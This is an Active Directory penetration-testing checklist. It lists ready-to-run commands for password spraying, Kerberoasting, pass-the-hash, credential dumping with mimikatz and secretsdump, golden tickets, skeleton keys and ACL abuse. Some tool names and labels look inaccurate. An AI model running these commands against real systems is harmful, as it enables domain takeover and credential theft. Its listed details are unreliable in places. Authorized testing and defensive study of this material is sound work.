# Active Directory Penetration Testing Checklist

Systematic methodology for enumerating and exploiting Windows Active Directory environments during authorized assessments.

---

## Phase 1: Initial Reconnaissance

### Network Discovery
- [ ] Identify domain controllers:
  ```bash
  nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>
  dig SRV _ldap._tcp.dc._msdcs.<domain>
  ```
- [ ] Ping sweep for live hosts:
  ```bash
  nmap -sn 10.0.0.0/24
  ```
- [ ] Port scan domain controllers:
  ```bash
  nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,9389 <DC_IP>
  ```

### Key Ports
| Port | Service | Purpose |
|------|---------|---------|
| 53 | DNS | Domain name resolution |
| 88 | Kerberos | Authentication |
| 135 | RPC | Remote procedure calls |
| 139/445 | SMB | File sharing, AD replication |
| 389 | LDAP | Directory queries |
| 464 | Kerberos Password | Password changes |
| 636 | LDAPS | Secure LDAP |
| 3268/3269 | Global Catalog | Forest-wide searches |
| 5985 | WinRM | Remote management |
| 9389 | ADWS | Active Directory Web Services |

---

## Phase 2: Enumeration

### Anonymous/Low-Privilege Enumeration
- [ ] Check for null sessions:
  ```bash
  rpcclient -U "" <DC_IP>
  smbclient -L //<DC_IP> -U ""
  ```
- [ ] Enumerate users via LDAP:
  ```bash
  ldapsearch -x -H ldap://<DC_IP> -b "DC=domain,DC=local" "(objectClass=person)"
  ```
- [ ] Check for anonymous binds:
  ```bash
  nmap -p 389 --script ldap-search <DC_IP>
  ```

### Authenticated Enumeration

#### Using CrackMapExec
```bash
# Enumerate users
crackmapexec smb <DC_IP> -u user -p pass --users

# Enumerate groups
crackmapexec smb <DC_IP> -u user -p pass --groups

# Enumerate shares
crackmapexec smb <DC_IP> -u user -p pass --shares

# Enumerate sessions
crackmapexec smb <DC_IP> -u user -p pass --sessions

# Check for privileged users
crackmapexec smb <DC_IP> -u user -p pass --loggedon-users
```

#### Using BloodHound
```bash
# Ingest data with SharpHound (Windows)
.\SharpHound.exe -c All

# Or with BloodHound.py (Linux)
bloodhound-python -u user -p pass -d domain.local -dc <DC_IP> -c All

# Upload to BloodHound and analyze paths
```

#### Using Impacket
```bash
# Enumerate users
impacket-getUsers -dc-ip <DC_IP> domain/user:pass

# Enumerate groups
impacket-getGroups -dc-ip <DC_IP> domain/user:pass

# Dump LSA secrets
impacket-secretsdump -dc-ip <DC_IP> domain/user:pass@<DC_IP>

# Enumerate shares
impacket-lookupsid -dc-ip <DC_IP> domain/user:pass@<DC_IP>
```

#### Using PowerView (PowerShell)
```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Get domain users
Get-DomainUser

# Get domain computers
Get-DomainComputer

# Get domain trusts
Get-DomainTrust

# Find users with SPNs (for Kerberoasting)
Get-DomainUser -SPN

# Find unconstrained delegation
Get-DomainComputer -Unconstrained

# Find constrained delegation
Get-DomainComputer -TrustedToAuth
```

---

## Phase 3: Credential Attacks

### Password Spraying
- [ ] Test common passwords against all users:
  ```bash
  crackmapexec smb <DC_IP> -u users.txt -p passwords.txt --continue-on-success
  ```
- [ ] Avoid account lockout:
  - Use 1-2 passwords per spray
  - Space out attempts
  - Monitor lockout policies

### Kerberoasting
- [ ] Identify users with SPNs:
  ```bash
  crackmapexec ldap <DC_IP> -u user -p pass --kerberoasting
  impacket-GetUserSPNs -dc-ip <DC_IP> domain/user:pass -request
  ```
- [ ] Crack TGS tickets:
  ```bash
  hashcat -m 13100 tickets.kirbi rockyou.txt
  john --format=krb5tgs --wordlist=rockyou.txt tickets.txt
  ```

### AS-REP Roasting
- [ ] Find users without pre-authentication:
  ```bash
  crackmapexec ldap <DC_IP> -u user -p pass --asreproast
  impacket-GetNPUsers -dc-ip <DC_IP> domain/ -usersfile users.txt -format hashcat
  ```
- [ ] Crack AS-REP hashes:
  ```bash
  hashcat -m 18200 asrep.hashes rockyou.txt
  ```

### Pass-the-Hash
- [ ] Extract NTLM hashes:
  ```bash
  impacket-secretsdump -dc-ip <DC_IP> domain/user:pass@<DC_IP>
  mimikatz sekurlsa::logonpasswords
  ```
- [ ] Use hash for authentication:
  ```bash
  crackmapexec smb <TARGET> -u user -H <NTLM_HASH>
  impacket-psexec -hashes :<NTLM_HASH> domain/user@<TARGET>
  ```

### Pass-the-Ticket
- [ ] Extract Kerberos tickets:
  ```powershell
  mimikatz sekurlsa::tickets /export
  ```
- [ ] Inject tickets:
  ```powershell
  mimikatz kerberos::ptt ticket.kirbi
  ```

---

## Phase 4: Lateral Movement

### PsExec
```bash
impacket-psexec -dc-ip <DC_IP> domain/user:pass@<TARGET>
crackmapexec smb <TARGET> -u user -p pass -x "whoami"
```

### WMI
```bash
impacket-wmiexec -dc-ip <DC_IP> domain/user:pass@<TARGET>
wmic /node:<TARGET> /user:domain\user process call create "cmd.exe"
```

### WinRM
```bash
evil-winrm -i <TARGET> -u user -p pass
crackmapexec winrm <TARGET> -u user -p pass -x "whoami"
```

### SMB Exec
```bash
impacket-smbexec -dc-ip <DC_IP> domain/user:pass@<TARGET>
```

### DCOM
```powershell
$dcom = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","<TARGET>"))
$dcom.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c whoami","7")
```

---

## Phase 5: Privilege Escalation

### Domain Admin Enumeration
- [ ] Find Domain Admins:
  ```bash
  crackmapexec ldap <DC_IP> -u user -p pass --groups "Domain Admins"
  net group "Domain Admins" /domain
  ```
- [ ] Find Enterprise Admins (forest root):
  ```bash
  net group "Enterprise Admins" /domain
  ```

### ACL Abuse
- [ ] Check ACLs with BloodHound:
  - Look for **GenericAll**, **GenericWrite**, **WriteDacl**, **WriteOwner**
  - Find shortest path to Domain Admins
- [ ] Abuse ACLs with PowerView:
  ```powershell
  # Check permissions on object
  Get-ObjectAcl -Identity "DC=domain,DC=local" -ResolveGUIDs

  # Add user to group (if GenericAll)
  Add-DomainGroupMember -Identity "Domain Admins" -Members user

  # Modify user password (if GenericWrite)
  Set-DomainUserPassword -Identity user -AccountPassword (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
  ```

### Group Policy Abuse
- [ ] Check for writable GPOs:
  ```powershell
  Get-DomainGPO | Get-ObjectAcl -ResolveGUIDs | ?{$_.ActiveDirectoryRights -match "GenericAll|GenericWrite"}
  ```
- [ ] Modify GPO to execute code:
  - Add scheduled task
  - Deploy malicious script via GPO preferences
  - Modify login scripts

### Unconstrained Delegation
- [ ] Find computers with unconstrained delegation:
  ```bash
  crackmapexec ldap <DC_IP> -u user -p pass --unconstrained
  ```
- [ ] Wait for admin to authenticate and capture TGT:
  ```powershell
  mimikatz sekurlsa::tickets /export
  ```

### Constrained Delegation
- [ ] Find users/computers with constrained delegation:
  ```bash
  crackmapexec ldap <DC_IP> -u user -p pass --trusted-to-auth
  ```
- [ ] Request TGS for target service:
  ```bash
  impacket-getST -spn cifs/<TARGET> -impersonate admin domain/user:pass
  ```

### Resource-Based Constrained Delegation (RBCD)
- [ ] Check if user can create computers:
  ```powershell
  Get-DomainObjectAcl -Identity "DC=domain,DC=local" | ?{$_.SecurityIdentifier -eq (Get-DomainUser user).ObjectSid}
  ```
- [ ] Create computer account and configure RBCD:
  ```powershell
  New-MachineAccount -MachineAccount evil -Password (ConvertTo-SecureString "Password123!" -AsPlainText -Force)
  Set-DomainObject -Identity <TARGET$> -Set @{"msDS-AllowedToActOnBehalfOfOtherIdentity"=<evil$SID>}
  ```

---

## Phase 6: Persistence

### Golden Ticket
- [ ] Extract krbtgt hash:
  ```bash
  impacket-secretsdump -dc-ip <DC_IP> domain/user:pass@<DC_IP>
  ```
- [ ] Create golden ticket:
  ```powershell
  mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /krbtgt:<HASH> /id:500
  mimikatz misc::cmd
  ```

### Silver Ticket
- [ ] Create ticket for specific service:
  ```powershell
  mimikatz kerberos::golden /user:admin /domain:domain.local /sid:S-1-5-21-... /target:<SERVICE> /service:cifs /rc4:<SERVICE_HASH>
  ```

### DCShadow
- [ ] Register rogue DC (requires DA):
  ```powershell
  mimikatz lsadump::dcshadow /object:user /attribute:Description /value="Backdoor"
  ```

### AdminSDHolder Abuse
- [ ] Modify AdminSDHolder ACL:
  ```powershell
  Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder,CN=System' -PrincipalSamAccountName user -Rights All
  ```

### Skeleton Key
- [ ] Inject skeleton key into LSASS (requires DA on DC):
  ```powershell
  mimikatz privilege::debug
  mimikatz misc::skeleton
  # All users can now authenticate with "mimikatz" as password
  ```

---

## Phase 7: Data Exfiltration

### Dump Domain Credentials
- [ ] Dump NTDS.dit:
  ```bash
  impacket-secretsdump -dc-ip <DC_IP> domain/user:pass@<DC_IP>
  ```
- [ ] Extract from backup:
  ```bash
  impacket-secretsdump -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
  ```

### Identify Sensitive Data
- [ ] Search for credentials in:
  - Group Policy Preferences (GPP)
  - LSA secrets
  - Scheduled tasks
  - Service accounts
  - Configuration files

### Export BloodHound Data
- [ ] Save BloodHound analysis for reporting
- [ ] Document attack paths and findings

---

## Quick Reference: Common AD Attacks

| Attack | Prerequisite | Impact |
|--------|-------------|--------|
| Password Spraying | Valid usernames | Low-privilege access |
| Kerberoasting | User with SPN | Service account compromise |
| AS-REP Roasting | User without pre-auth | User compromise |
| Pass-the-Hash | NTLM hash | Lateral movement |
| DCSync | Replication rights | Dump all hashes |
| Golden Ticket | krbtgt hash | Full domain persistence |
| ACL Abuse | Write permissions on object | Privilege escalation |
| Delegation Abuse | Delegation config | Impersonation |

---

## Tools Summary

| Tool | Purpose | URL |
|------|---------|-----|
| CrackMapExec | Swiss-army knife for AD | github.com/Porchetta-Industries/CrackMapExec |
| BloodHound | AD attack path visualization | github.com/BloodHoundAD/BloodHound |
| Impacket | Python AD exploitation | github.com/SecureAuthCorp/impacket |
| PowerView | PowerShell AD enumeration | github.com/PowerShellMafia/PowerSploit |
| Mimikatz | Credential extraction | github.com/gentilkiwi/mimikatz |
| Evil-WinRM | WinRM shell | github.com/Hackplayers/evil-winrm |
| Rubeus | Kerberos abuse | github.com/GhostPack/Rubeus |

---

## Methodology Checklist

1. **Reconnaissance:** Identify DCs, scan ports, enumerate shares
2. **Enumeration:** Users, groups, ACLs, trusts, delegation
3. **Credential Attacks:** Spraying, Kerberoasting, AS-REP roasting
4. **Lateral Movement:** PsExec, WMI, WinRM, DCOM
5. **Privilege Escalation:** ACL abuse, delegation, GPO
6. **Persistence:** Golden/Silver tickets, DCShadow, Skeleton Key
7. **Exfiltration:** Dump NTDS.dit, document findings

---

*Last updated: 2026-04-06*
